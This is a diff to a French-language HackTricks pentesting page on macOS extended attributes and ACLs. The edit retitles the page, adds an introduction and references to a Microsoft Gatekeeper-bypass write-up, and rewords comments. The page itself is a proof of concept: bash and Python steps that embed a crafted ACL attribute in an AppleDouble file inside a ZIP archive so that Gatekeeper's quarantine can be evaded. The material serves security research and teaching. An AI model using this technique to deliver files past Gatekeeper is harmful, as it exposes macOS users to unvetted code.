@@ -1,6 +1,8 @@
-# macOS xattr-acls contenu supplémentaire
+# Informations supplémentaires sur les xattr et les ACL de macOS
 
 {{#include ../../../../banners/hacktricks-training.md}}
+
+La preuve de concept suivante recrée la technique AppleDouble/ACL utilisée par la recherche sur le contournement de Gatekeeper : elle sérialise une ACL en tant qu'attribut étendu, la conserve dans un fichier AppleDouble, renomme l'attribut en `com.apple.acl.text`, puis reconstruit l'archive ZIP avec `ditto`.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -57,7 +59,7 @@ return 0;
 ```
 </details>
 ```bash
-# Lets add the xattr com.apple.xxx.xxxx with the acls
+# Add the com.apple.xxx.xxxx extended attribute containing the ACL
 mkdir start
 mkdir start/protected
 ./set_xattr start/protected
@@ -150,12 +152,12 @@ return 0;
 ```
 </details>
 ```bash
-# Create appledoublefile with the xattr entitlement
+# Create an AppleDouble file containing the extended attribute
 ditto -c -k start protected.zip
 rm -rf start
 # extract the files
 unzip protected.zip
-# Replace the name of the xattr here (if you put it before ditto would have destroyed it)
+# Replace the extended-attribute name here (ditto would otherwise remove com.apple.acl.text)
 python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
 # zip everything back together
 rm -rf protected.zip
@@ -169,4 +171,8 @@ rm ._*
 ditto -x -k --rsrc protected.zip .
 xattr -l protected
 ```
+## References
+
+- [1] [Microsoft Security Blog — Le talon d’Achille de Gatekeeper : découverte d’une vulnérabilité macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — Empaqueter des logiciels Mac pour distribution avec `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 {{#include ../../../../banners/hacktricks-training.md}}
